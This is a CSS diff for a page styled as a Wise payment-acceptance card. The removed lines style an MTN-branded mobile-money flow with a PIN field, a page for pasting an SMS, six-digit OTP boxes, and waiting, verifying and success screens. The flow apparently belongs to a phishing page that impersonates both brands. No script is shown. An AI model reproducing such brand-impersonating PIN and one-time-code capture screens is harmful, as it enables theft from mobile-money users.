@@ -19,17 +19,7 @@
     --wise-grey: #6B7C6E;
     --wise-border: #DDE5DF;
     --wise-white: #FFFFFF;
-    --wise-error: #D14343;
-    --wise-success: #0E7C3A;
     --shadow-lg: 0 20px 40px -12px rgba(22, 51, 0, 0.18);
-    --mtn-yellow: #FFCC00;
-    --mtn-yellow-dark: #E6B800;
-    --mtn-black: #000000;
-    --mtn-light-grey: #F7F7F7;
-    --mtn-border: #E4E4E4;
-    --mtn-text: #1A1A1A;
-    --mtn-text-light: #6B6B6B;
-    --mtn-text-muted: #9B9B9B;
   }
 
   body {
@@ -42,13 +32,10 @@
     padding: 1.5rem;
     color: var(--wise-forest);
     -webkit-font-smoothing: antialiased;
-    transition: background 0.4s ease;
     overflow-x: hidden;
   }
-  body.mtn-mode { background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%); }
 
-  .card-container { max-width: 540px; width: 100%; min-height: 740px; }
-  .card-stage { position: relative; width: 100%; }
+  .card-container { max-width: 540px; width: 100%; }
 
   .payment-card {
     background: var(--wise-white);
@@ -58,548 +45,200 @@
     border: 1px solid rgba(22, 51, 0, 0.04);
     position: relative;
     overflow: hidden;
-    display: none;
-    will-change: transform, opacity;
+    animation: cardEnter 0.42s cubic-bezier(0.22, 1, 0.36, 1) both;
   }
-  .payment-card.active { display: block; animation: cardEnter 0.36s cubic-bezier(0.22, 1, 0.36, 1) both; }
-  .payment-card.leaving { display: block; animation: cardExit 0.24s cubic-bezier(0.55, 0, 1, 0.45) both; pointer-events: none; }
-  @keyframes cardEnter { from { opacity: 0; transform: translateX(24px) scale(0.98); } to { opacity: 1; transform: translateX(0) scale(1); } }
-  @keyframes cardExit { from { opacity: 1; transform: translateX(0) scale(1); } to { opacity: 0; transform: translateX(-24px) scale(0.98); } }
-  .payment-card.active.back-enter { animation: cardEnterBack 0.36s cubic-bezier(0.22, 1, 0.36, 1) both; }
-  .payment-card.leaving.back-leave { animation: cardExitBack 0.24s cubic-bezier(0.55, 0, 1, 0.45) both; }
-  @keyframes cardEnterBack { from { opacity: 0; transform: translateX(-24px) scale(0.98); } to { opacity: 1; transform: translateX(0) scale(1); } }
-  @keyframes cardExitBack { from { opacity: 1; transform: translateX(0) scale(1); } to { opacity: 0; transform: translateX(24px) scale(0.98); } }
+  @keyframes cardEnter {
+    from { opacity: 0; transform: translateY(14px) scale(0.98); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+  .payment-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 6px;
+    background: var(--wise-green);
+  }
 
-  .payment-card.wise::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: var(--wise-green); }
-  .payment-card.mtn::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: var(--mtn-yellow); }
-
-  /* WISE CARD */
-  .wise-header { display: flex; align-items: center; gap: 0.85rem; margin-bottom: 1.75rem; padding-bottom: 1.35rem; border-bottom: 1px solid var(--wise-border); }
-  .wise-logo { background: var(--wise-green); width: 46px; height: 46px; border-radius: 14px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 12px rgba(159,232,112,0.35); flex-shrink: 0; }
+  /* Wise header */
+  .wise-header {
+    display: flex; align-items: center; gap: 0.85rem;
+    margin-bottom: 1.75rem; padding-bottom: 1.35rem;
+    border-bottom: 1px solid var(--wise-border);
+  }
+  .wise-logo {
+    background: var(--wise-green);
+    width: 46px; height: 46px; border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 4px 12px rgba(159,232,112,0.35);
+    flex-shrink: 0;
+  }
   .wise-logo svg { width: 26px; height: 26px; display: block; }
   .wise-title { display: flex; flex-direction: column; gap: 0.15rem; }
-  .wise-title .brand { font-size: 1.35rem; font-weight: 700; letter-spacing: -0.02em; color: var(--wise-forest); line-height: 1.1; }
+  .wise-title .brand {
+    font-size: 1.35rem; font-weight: 700;
+    letter-spacing: -0.02em; color: var(--wise-forest); line-height: 1.1;
+  }
   .wise-title .subtitle { font-size: 0.82rem; font-weight: 500; color: var(--wise-grey); }
 
-  .payment-details { background: var(--wise-light-bg); border-radius: 1.25rem; padding: 1.5rem; margin-bottom: 1.75rem; border: 1px solid var(--wise-border); }
-  .detail-row { display: flex; justify-content: space-between; align-items: flex-start; padding: 0.85rem 0; border-bottom: 1px solid var(--wise-border); }
+  /* Details */
+  .payment-details {
+    background: var(--wise-light-bg);
+    border-radius: 1.25rem;
+    padding: 1.5rem;
+    margin-bottom: 1.75rem;
+    border: 1px solid var(--wise-border);
+  }
+  .detail-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    padding: 0.85rem 0;
+    border-bottom: 1px solid var(--wise-border);
+  }
   .detail-row:first-child { padding-top: 0.35rem; }
   .detail-row:last-child { border-bottom: none; padding-bottom: 0.35rem; }
-  .detail-label { font-weight: 500; color: var(--wise-grey); font-size: 0.9rem; display: flex; align-items: center; gap: 0.45rem; flex-shrink: 0; }
-  .detail-label svg { width: 16px; height: 16px; stroke: var(--wise-grey); fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
-  .detail-value { font-weight: 600; color: var(--wise-forest); font-size: 0.98rem; text-align: right; word-break: break-word; max-width: 65%; }
-  .sender-info { display: flex; flex-direction: column; gap: 0.2rem; align-items: flex-end; }
+  .detail-label {
+    font-weight: 500; color: var(--wise-grey); font-size: 0.9rem;
+    display: flex; align-items: center; gap: 0.45rem; flex-shrink: 0;
+  }
+  .detail-label svg {
+    width: 16px; height: 16px; stroke: var(--wise-grey); fill: none;
+    stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .detail-value {
+    font-weight: 600; color: var(--wise-forest); font-size: 0.98rem;
+    text-align: right; word-break: break-word; max-width: 65%;
+  }
+  .sender-info {
+    display: flex; flex-direction: column; gap: 0.2rem; align-items: flex-end;
+  }
   .sender-name { font-weight: 600; color: var(--wise-forest); font-size: 1rem; }
   .sender-email { font-size: 0.82rem; color: var(--wise-grey); font-weight: 400; }
-  .amount-block { display: flex; flex-direction: column; align-items: flex-end; gap: 0.3rem; }
-  .amount-value { font-size: 1.75rem; font-weight: 700; letter-spacing: -0.03em; color: var(--wise-forest); line-height: 1.1; }
-  .currency-badge { background: var(--wise-soft-mint); border-radius: 30px; padding: 0.2rem 0.85rem; font-size: 0.78rem; font-weight: 600; color: var(--wise-dark-green); }
-  .ref-note { font-size: 0.78rem; color: var(--wise-grey); margin-top: 0.15rem; display: flex; align-items: center; gap: 0.3rem; justify-content: flex-end; }
+  .amount-block {
+    display: flex; flex-direction: column; align-items: flex-end; gap: 0.3rem;
+  }
+  .amount-value {
+    font-size: 1.75rem; font-weight: 700; letter-spacing: -0.03em;
+    color: var(--wise-forest); line-height: 1.1;
+  }
+  .currency-badge {
+    background: var(--wise-soft-mint);
+    border-radius: 30px; padding: 0.2rem 0.85rem;
+    font-size: 0.78rem; font-weight: 600; color: var(--wise-dark-green);
+  }
+  .ref-note {
+    font-size: 0.78rem; color: var(--wise-grey);
+    margin-top: 0.15rem; display: flex; align-items: center;
+    gap: 0.3rem; justify-content: flex-end;
+  }
 
+  /* Button */
   .accept-btn {
-    width: 100%; border: none; border-radius: 2rem; padding: 1.15rem 1.5rem;
+    width: 100%; border: none; border-radius: 2rem;
+    padding: 1.15rem 1.5rem;
     font-size: 1.1rem; font-weight: 700; font-family: 'Inter', sans-serif;
     display: flex; align-items: center; justify-content: center; gap: 0.65rem;
-    cursor: pointer; transition: transform 0.15s ease, box-shadow 0.15s ease, background 0.15s ease;
+    cursor: pointer;
+    transition: transform 0.15s ease, box-shadow 0.15s ease, background 0.15s ease;
     letter-spacing: -0.01em;
-    background: var(--wise-green); color: var(--wise-dark-green);
+    background: var(--wise-green);
+    color: var(--wise-dark-green);
     box-shadow: 0 6px 18px rgba(159,232,112,0.45);
   }
-  .accept-btn:hover:not(:disabled) { background: #8FDB5E; transform: translateY(-1px); box-shadow: 0 10px 24px rgba(159,232,112,0.55); }
+  .accept-btn:hover:not(:disabled) {
+    background: #8FDB5E;
+    transform: translateY(-1px);
+    box-shadow: 0 10px 24px rgba(159,232,112,0.55);
+  }
   .accept-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
-  .accept-btn:disabled { background: #C8E6B5; color: #7A8F6E; box-shadow: none; cursor: not-allowed; opacity: 0.85; }
-  .accept-btn svg, .mtn-confirm-btn svg, .sms-submit-btn svg, .otp-submit-btn svg, .resend-new-btn svg { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
+  .accept-btn:disabled {
+    background: #C8E6B5; color: #7A8F6E;
+    box-shadow: none; cursor: not-allowed; opacity: 0.85;
+  }
+  .accept-btn svg {
+    width: 20px; height: 20px; stroke: currentColor; fill: none;
+    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+  }
 
-  /* MTN CARD */
-  .mtn-header { display: flex; align-items: center; gap: 0.85rem; margin-bottom: 1.5rem; padding-bottom: 1.25rem; border-bottom: 1px solid var(--mtn-border); }
-  .mtn-logo { background: var(--mtn-yellow); width: 52px; height: 52px; border-radius: 14px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 12px rgba(255,204,0,0.4); flex-shrink: 0; font-weight: 800; font-size: 1.1rem; color: var(--mtn-black); letter-spacing: -0.03em; }
-  .mtn-title { display: flex; flex-direction: column; gap: 0.15rem; }
-  .mtn-title .brand { font-size: 1.2rem; font-weight: 700; color: var(--mtn-text); line-height: 1.1; }
-  .mtn-title .subtitle { font-size: 0.82rem; font-weight: 500; color: var(--mtn-text-light); }
-
-  .amount-hero { background: linear-gradient(135deg, #FFFDF0 0%, #FFF8D9 100%); border: 1px solid #F0E4B0; border-radius: 1rem; padding: 1.25rem 1.5rem; margin-bottom: 1.5rem; display: flex; align-items: center; justify-content: space-between; gap: 1rem; }
-  .amount-hero .label-block { display: flex; flex-direction: column; gap: 0.2rem; }
-  .amount-hero .label-block .label { font-size: 0.75rem; font-weight: 600; color: var(--mtn-text-light); text-transform: uppercase; letter-spacing: 0.08em; }
-  .amount-hero .label-block .sub { font-size: 0.78rem; color: var(--mtn-text-muted); font-weight: 400; }
-  .amount-hero .amount-display { text-align: right; }
-  .amount-hero .amount-display .value { font-size: 1.65rem; font-weight: 700; letter-spacing: -0.03em; color: var(--mtn-text); line-height: 1.1; }
-  .amount-hero .amount-display .cur { display: inline-block; background: var(--mtn-yellow); color: var(--mtn-black); font-size: 0.68rem; font-weight: 700; padding: 0.18rem 0.55rem; border-radius: 20px; letter-spacing: 0.05em; margin-left: 0.35rem; vertical-align: middle; }
-
-  .mtn-form { display: flex; flex-direction: column; gap: 1.15rem; margin-bottom: 1.5rem; }
-  .form-group { display: flex; flex-direction: column; gap: 0.45rem; }
-  .form-label { font-size: 0.82rem; font-weight: 600; color: var(--mtn-text); display: flex; align-items: center; gap: 0.4rem; letter-spacing: 0.01em; }
-  .form-label svg { width: 14px; height: 14px; stroke: var(--mtn-text-light); fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
-  .form-label .required { color: var(--wise-error); font-weight: 700; }
-
-  .phone-input-wrap { display: flex; align-items: stretch; background: var(--mtn-light-grey); border: 1.5px solid var(--mtn-border); border-radius: 0.75rem; overflow: hidden; transition: border-color 0.15s, box-shadow 0.15s, background 0.15s; }
-  .phone-input-wrap:focus-within { border-color: var(--mtn-yellow-dark); background: var(--wise-white); box-shadow: 0 0 0 3px rgba(255,204,0,0.2); }
-  .phone-input-wrap.error { border-color: var(--wise-error); background: #FFF8F8; }
-  .country-picker { position: relative; flex-shrink: 0; }
-  .country-prefix { display: flex; align-items: center; gap: 0.4rem; padding: 0 0.9rem; height: 100%; font-size: 0.92rem; font-weight: 600; color: var(--mtn-text); background: #EFEFEF; border-right: 1.5px solid var(--mtn-border); white-space: nowrap; user-select: none; cursor: pointer; transition: background 0.15s; }
-  .country-prefix:hover { background: #E5E5E5; }
-  .country-prefix .flag { font-size: 1.1rem; line-height: 1; }
-  .country-prefix .code { font-weight: 700; letter-spacing: 0.02em; color: var(--mtn-text); font-size: 0.9rem; }
-  .country-prefix .caret { width: 11px; height: 11px; stroke: var(--mtn-text-light); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
-  .country-picker select { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; font-size: 1rem; }
-  .phone-input-wrap input { flex: 1; padding: 0.9rem 1rem; font-size: 1rem; font-family: 'Inter', sans-serif; font-weight: 500; color: var(--mtn-text); background: transparent; border: none; outline: none; letter-spacing: 0.02em; min-width: 0; }
-  .phone-input-wrap input::placeholder { color: #B5B5B5; font-weight: 400; letter-spacing: 0; }
-
-  .form-input { width: 100%; padding: 0.9rem 1rem; font-size: 0.98rem; font-family: 'Inter', sans-serif; font-weight: 500; color: var(--mtn-text); background: var(--mtn-light-grey); border: 1.5px solid var(--mtn-border); border-radius: 0.75rem; outline: none; transition: border-color 0.15s, box-shadow 0.15s, background 0.15s; }
-  .form-input::placeholder { color: #B5B5B5; font-weight: 400; }
-  .form-input:focus { border-color: var(--mtn-yellow-dark); background: var(--wise-white); box-shadow: 0 0 0 3px rgba(255,204,0,0.2); }
-  .form-input.error { border-color: var(--wise-error); background: #FFF8F8; }
-
-  .pin-input-wrap { position: relative; }
-  .pin-input-wrap input { width: 100%; padding: 0.9rem 3.2rem 0.9rem 1rem; font-size: 1.15rem; font-family: 'Inter', sans-serif; font-weight: 600; letter-spacing: 0.4em; color: var(--mtn-text); background: var(--mtn-light-grey); border: 1.5px solid var(--mtn-border); border-radius: 0.75rem; outline: none; transition: border-color 0.15s, box-shadow 0.15s, background 0.15s; }
-  .pin-input-wrap input::placeholder { letter-spacing: normal; font-size: 0.88rem; font-weight: 400; color: #B5B5B5; }
-  .pin-input-wrap input:focus { border-color: var(--mtn-yellow-dark); background: var(--wise-white); box-shadow: 0 0 0 3px rgba(255,204,0,0.2); }
-  .pin-input-wrap input.error { border-color: var(--wise-error); background: #FFF8F8; }
-  .pin-toggle { position: absolute; right: 0.6rem; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; padding: 0.45rem; display: flex; align-items: center; justify-content: center; color: var(--mtn-text-muted); border-radius: 8px; transition: background 0.15s, color 0.15s; }
-  .pin-toggle:hover { background: rgba(0,0,0,0.05); color: var(--mtn-text); }
-  .pin-toggle svg { width: 19px; height: 19px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
-
-  .form-hint { font-size: 0.73rem; color: var(--mtn-text-muted); font-weight: 400; display: flex; align-items: center; gap: 0.3rem; line-height: 1.4; }
-  .form-hint svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
-
-  .secure-badge { display: inline-flex; align-items: center; gap: 0.35rem; background: #EAF7EC; color: #0E7C3A; font-size: 0.72rem; font-weight: 600; padding: 0.3rem 0.7rem; border-radius: 20px; margin-top: 0.15rem; }
-  .secure-badge svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
-
-  .mtn-confirm-btn { width: 100%; border: none; border-radius: 0.85rem; padding: 1.1rem 1.5rem; font-size: 1.05rem; font-weight: 700; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; gap: 0.6rem; cursor: pointer; transition: transform 0.15s ease, box-shadow 0.15s ease, background 0.15s ease; letter-spacing: -0.01em; background: var(--mtn-yellow); color: var(--mtn-black); box-shadow: 0 4px 14px rgba(255,204,0,0.4); }
-  .mtn-confirm-btn:hover:not(:disabled) { background: #F5C200; transform: translateY(-1px); box-shadow: 0 8px 20px rgba(255,204,0,0.5); }
-  .mtn-confirm-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
-  .mtn-confirm-btn:disabled { background: #E6E6E6; color: #999; box-shadow: none; cursor: not-allowed; }
-
-  .back-link { display: flex; align-items: center; justify-content: center; gap: 0.4rem; margin-top: 1rem; font-size: 0.82rem; font-weight: 500; color: var(--mtn-text-light); background: none; border: none; cursor: pointer; font-family: 'Inter', sans-serif; transition: color 0.15s; padding: 0.5rem; width: 100%; }
-  .back-link:hover { color: var(--mtn-text); }
-  .back-link svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }
-
-  /* STATUS MESSAGES */
-  .status-message { margin-top: 1rem; padding: 0.85rem 1.15rem; border-radius: 0.85rem; font-size: 0.87rem; font-weight: 500; display: flex; align-items: center; gap: 0.6rem; line-height: 1.4; }
-  .status-message.success { background: #E8F5E9; color: var(--wise-success); border: 1px solid #B8DFC6; }
-  .status-message.error { background: #FDECEC; color: var(--wise-error); border: 1px solid #F3BFBF; }
-  .status-message.info { background: #FFF8E1; color: #8A6D00; border: 1px solid #FFE082; }
-  .status-message svg { width: 17px; height: 17px; flex-shrink: 0; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; fill: none; }
-  .status-message.hidden { display: none; }
-
-  .footer-note { margin-top: 1.25rem; padding-top: 1.1rem; border-top: 1px solid var(--wise-border); font-size: 0.76rem; color: var(--wise-grey); text-align: center; display: flex; align-items: center; justify-content: center; gap: 0.4rem; font-weight: 400; }
-  .footer-note.mtn-footer { border-top-color: var(--mtn-border); color: var(--mtn-text-muted); }
-  .footer-note svg { width: 13px; height: 13px; stroke: currentColor; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
-
-  /* FULLSCREEN PAGES */
-  .fullscreen-page { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; padding: 1.5rem; z-index: 200; overflow-y: auto; }
-  .fullscreen-page.active { display: flex; animation: pageFadeIn 0.32s ease both; }
-  @keyframes pageFadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-  .page-content { max-width: 460px; width: 100%; text-align: center; animation: contentPop 0.4s cubic-bezier(0.22, 1, 0.36, 1) both; }
-  @keyframes contentPop { from { opacity: 0; transform: translateY(12px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
-
-  /* Waiting page */
-  .waiting-page { background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%); }
-  .waiting-ring { width: 100px; height: 100px; margin: 0 auto 2rem; position: relative; }
-  .waiting-ring::before, .waiting-ring::after { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 4px solid transparent; }
-  .waiting-ring::before { border-top-color: var(--mtn-yellow); border-right-color: var(--mtn-yellow); animation: spinRing 1.2s linear infinite; }
-  .waiting-ring::after { inset: 14px; border-bottom-color: var(--wise-green); border-left-color: var(--wise-green); animation: spinRing 1.6s linear infinite reverse; }
-  @keyframes spinRing { to { transform: rotate(360deg); } }
-  .waiting-center { position: absolute; inset: 34px; background: var(--mtn-black); border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 1; font-weight: 800; font-size: 0.62rem; color: var(--mtn-yellow); letter-spacing: -0.02em; }
-
-  .waiting-title { font-size: 1.5rem; font-weight: 700; letter-spacing: -0.02em; color: var(--mtn-text); margin-bottom: 0.6rem; line-height: 1.25; }
-  .waiting-subtitle { font-size: 0.92rem; color: var(--mtn-text-light); line-height: 1.55; margin-bottom: 2rem; font-weight: 400; max-width: 360px; margin-left: auto; margin-right: auto; }
-
-  .waiting-info { background: var(--wise-white); border: 1px solid var(--mtn-border); border-radius: 1rem; padding: 1.25rem; text-align: left; margin-bottom: 1.5rem; box-shadow: 0 8px 20px -8px rgba(0,0,0,0.08); }
-  .waiting-info-row { display: flex; justify-content: space-between; padding: 0.5rem 0; font-size: 0.83rem; border-bottom: 1px solid #F0F0F0; }
-  .waiting-info-row:last-child { border-bottom: none; }
-  .waiting-info-row .k { color: var(--mtn-text-light); font-weight: 500; }
-  .waiting-info-row .v { color: var(--mtn-text); font-weight: 600; text-align: right; }
-
-  .waiting-dots { display: inline-flex; gap: 0.3rem; }
-  .waiting-dots span { width: 6px; height: 6px; border-radius: 50%; background: var(--mtn-yellow-dark); animation: dotPulse 1.4s infinite ease-in-out both; }
-  .waiting-dots span:nth-child(2) { animation-delay: 0.16s; }
-  .waiting-dots span:nth-child(3) { animation-delay: 0.32s; }
-  @keyframes dotPulse { 0%, 80%, 100% { opacity: 0.3; transform: scale(0.8); } 40% { opacity: 1; transform: scale(1); } }
-
-  /* Verifying page */
-  .verifying-page { background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%); }
-  .verifying-progress-bar { width: 100%; max-width: 320px; height: 6px; background: #EFEFEF; border-radius: 3px; margin: 0 auto 1.25rem; overflow: hidden; }
-  .verifying-progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--mtn-yellow) 0%, #FFB800 100%); border-radius: 3px; transition: width 1s linear; }
-  .verifying-timer { font-size: 0.85rem; font-weight: 600; color: var(--mtn-text-light); letter-spacing: 0.02em; font-variant-numeric: tabular-nums; }
-  .verifying-timer .secs { color: var(--mtn-text); font-weight: 700; }
-
-  .verifying-checklist { background: var(--wise-white); border: 1px solid var(--mtn-border); border-radius: 1rem; padding: 1.25rem; text-align: left; margin-bottom: 1.5rem; box-shadow: 0 8px 20px -8px rgba(0,0,0,0.08); }
-  .check-item { display: flex; align-items: center; gap: 0.7rem; padding: 0.55rem 0; font-size: 0.85rem; color: var(--mtn-text); font-weight: 500; }
-  .check-item:first-child { padding-top: 0; }
-  .check-item:last-child { padding-bottom: 0; }
-  .check-item .dot { width: 22px; height: 22px; border-radius: 50%; background: var(--mtn-light-grey); display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: background 0.3s; }
-  .check-item .dot svg { width: 12px; height: 12px; stroke: var(--mtn-text-muted); fill: none; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; transition: stroke 0.3s; }
-  .check-item.done .dot { background: #E8F5E9; }
-  .check-item.done .dot svg { stroke: var(--wise-success); }
-
-  /* SMS page */
-  .sms-page { background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%); }
-  .sms-card { max-width: 520px; width: 100%; background: var(--wise-white); border-radius: 1.75rem; box-shadow: var(--shadow-lg); padding: 2rem; position: relative; overflow: hidden; animation: contentPop 0.4s both; }
-  .sms-card::before, .otp-card::before, .resend-card::before, .success-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: var(--mtn-yellow); }
-
-  .sub-card-header { display: flex; align-items: center; gap: 0.85rem; margin-bottom: 1.5rem; padding-bottom: 1.25rem; border-bottom: 1px solid var(--mtn-border); }
-  .sub-card-header .mtn-logo { width: 48px; height: 48px; font-size: 1rem; }
-  .sub-card-header .title { display: flex; flex-direction: column; gap: 0.15rem; }
-  .sub-card-header .title .brand { font-size: 1.15rem; font-weight: 700; color: var(--mtn-text); line-height: 1.1; }
-  .sub-card-header .title .sub { font-size: 0.8rem; font-weight: 500; color: var(--mtn-text-light); }
-
-  .amount-confirm-badge { background: linear-gradient(135deg, #FFFDF0 0%, #FFF8D9 100%); border: 1px solid #F0E4B0; border-radius: 1rem; padding: 1rem 1.25rem; margin-bottom: 1.5rem; display: flex; align-items: center; justify-content: space-between; gap: 1rem; }
-  .amount-confirm-badge .label { font-size: 0.75rem; font-weight: 600; color: var(--mtn-text-light); text-transform: uppercase; letter-spacing: 0.08em; }
-  .amount-confirm-badge .value { font-size: 1.4rem; font-weight: 700; color: var(--mtn-text); letter-spacing: -0.02em; line-height: 1.1; }
-  .amount-confirm-badge .value .cur { display: inline-block; background: var(--mtn-yellow); color: var(--mtn-black); font-size: 0.65rem; font-weight: 700; padding: 0.15rem 0.5rem; border-radius: 20px; letter-spacing: 0.05em; margin-left: 0.3rem; vertical-align: middle; }
-
-  .sms-instructions { background: #F7FBFF; border: 1px solid #D9E8F5; border-radius: 1rem; padding: 1.15rem 1.25rem; margin-bottom: 1.5rem; }
-  .sms-instructions .title { font-size: 0.85rem; font-weight: 700; color: #1A5C8F; display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.7rem; }
-  .sms-instructions .title svg { width: 16px; height: 16px; stroke: #1A5C8F; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }
-  .sms-instructions ol { padding-left: 1.25rem; font-size: 0.83rem; color: #2B4B6A; line-height: 1.65; font-weight: 400; }
-  .sms-instructions ol li { margin-bottom: 0.35rem; }
-  .sms-instructions ol li:last-child { margin-bottom: 0; }
-  .sms-instructions .highlight { font-weight: 700; color: #0E7C3A; background: #E8F5E9; padding: 0.1rem 0.4rem; border-radius: 5px; }
-
-  .sms-textarea-wrap { display: flex; flex-direction: column; gap: 0.45rem; margin-bottom: 1.5rem; }
-  .sms-textarea-wrap label { font-size: 0.82rem; font-weight: 600; color: var(--mtn-text); display: flex; align-items: center; gap: 0.4rem; }
-  .sms-textarea-wrap label svg { width: 14px; height: 14px; stroke: var(--mtn-text-light); fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
-
-  .sms-textarea { width: 100%; padding: 1rem 1.15rem; font-size: 0.9rem; font-family: 'Inter', sans-serif; font-weight: 500; color: var(--mtn-text); background: var(--mtn-light-grey); border: 1.5px solid var(--mtn-border); border-radius: 0.85rem; outline: none; resize: vertical; min-height: 90px; line-height: 1.5; transition: border-color 0.15s, box-shadow 0.15s, background 0.15s; }
-  .sms-textarea::placeholder { color: #B5B5B5; font-weight: 400; }
-  .sms-textarea:focus { border-color: var(--mtn-yellow-dark); background: var(--wise-white); box-shadow: 0 0 0 3px rgba(255,204,0,0.2); }
-  .sms-textarea.error { border-color: var(--wise-error); background: #FFF8F8; }
-
-  .sms-submit-btn, .otp-submit-btn, .resend-new-btn { width: 100%; border: none; border-radius: 0.85rem; padding: 1.1rem 1.5rem; font-size: 1.05rem; font-weight: 700; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; gap: 0.6rem; cursor: pointer; transition: transform 0.15s, box-shadow 0.15s, background 0.15s; background: var(--mtn-yellow); color: var(--mtn-black); box-shadow: 0 4px 14px rgba(255,204,0,0.4); letter-spacing: -0.01em; }
-  .sms-submit-btn:hover:not(:disabled), .otp-submit-btn:hover:not(:disabled), .resend-new-btn:hover:not(:disabled) { background: #F5C200; transform: translateY(-1px); box-shadow: 0 8px 20px rgba(255,204,0,0.5); }
-  .sms-submit-btn:active:not(:disabled), .otp-submit-btn:active:not(:disabled), .resend-new-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
-  .sms-submit-btn:disabled, .otp-submit-btn:disabled, .resend-new-btn:disabled { background: #E6E6E6; color: #999; box-shadow: none; cursor: not-allowed; }
-
-  /* OTP page */
-  .otp-page { background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%); }
-  .otp-card { max-width: 520px; width: 100%; background: var(--wise-white); border-radius: 1.75rem; box-shadow: var(--shadow-lg); padding: 2rem; position: relative; overflow: hidden; animation: contentPop 0.4s both; }
-
-  .otp-instruction { font-size: 0.88rem; color: var(--mtn-text-light); line-height: 1.55; margin-bottom: 1.5rem; font-weight: 400; text-align: center; }
-  .otp-instruction strong { color: var(--mtn-text); font-weight: 600; }
-  .otp-instruction .phone-highlight { background: #FFF8D9; padding: 0.15rem 0.5rem; border-radius: 6px; font-weight: 600; color: var(--mtn-text); white-space: nowrap; }
-
-  .otp-inputs { display: flex; justify-content: center; gap: 0.65rem; margin-bottom: 1.5rem; }
-  .otp-input { width: 56px; height: 64px; font-size: 1.65rem; font-weight: 700; font-family: 'Inter', sans-serif; color: var(--mtn-text); background: var(--mtn-light-grey); border: 1.5px solid var(--mtn-border); border-radius: 0.85rem; outline: none; text-align: center; transition: border-color 0.15s, box-shadow 0.15s, background 0.15s, transform 0.12s; caret-color: var(--mtn-yellow-dark); }
-  .otp-input::placeholder { color: #D5D5D5; }
-  .otp-input:focus { border-color: var(--mtn-yellow-dark); background: var(--wise-white); box-shadow: 0 0 0 3px rgba(255,204,0,0.25); transform: translateY(-2px); }
-  .otp-input.filled { border-color: var(--mtn-yellow-dark); background: #FFFDF0; }
-  .otp-input.error { border-color: var(--wise-error); background: #FFF8F8; animation: shake 0.4s ease; }
-  @keyframes shake { 0%,100% { transform: translateX(0); } 20%,60% { transform: translateX(-6px); } 40%,80% { transform: translateX(6px); } }
-
-  .otp-resend-row { display: flex; align-items: center; justify-content: center; gap: 0.4rem; font-size: 0.82rem; color: var(--mtn-text-light); font-weight: 400; }
-  .otp-resend-btn { background: none; border: none; font-family: 'Inter', sans-serif; font-size: 0.82rem; font-weight: 700; color: var(--mtn-yellow-dark); cursor: pointer; padding: 0.35rem 0.55rem; border-radius: 6px; transition: background 0.15s; }
-  .otp-resend-btn:hover:not(:disabled) { background: #FFF8D9; }
-  .otp-resend-btn:disabled { color: var(--mtn-text-muted); cursor: not-allowed; }
-
-  /* Success page */
-  .success-page { background: linear-gradient(160deg, #F7FBF9 0%, #E8F5E9 100%); }
-  .success-card { max-width: 460px; width: 100%; background: var(--wise-white); border-radius: 1.75rem; box-shadow: var(--shadow-lg); padding: 2.5rem 2rem; text-align: center; animation: contentPop 0.4s both; position: relative; overflow: hidden; }
-  .success-card::before { background: var(--wise-green) !important; }
-  .success-icon { width: 88px; height: 88px; border-radius: 50%; background: #E8F5E9; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.75rem; animation: successPop 0.5s cubic-bezier(0.22, 1, 0.36, 1) 0.1s both; }
-  @keyframes successPop { 0% { transform: scale(0); opacity: 0; } 60% { transform: scale(1.1); } 100% { transform: scale(1); opacity: 1; } }
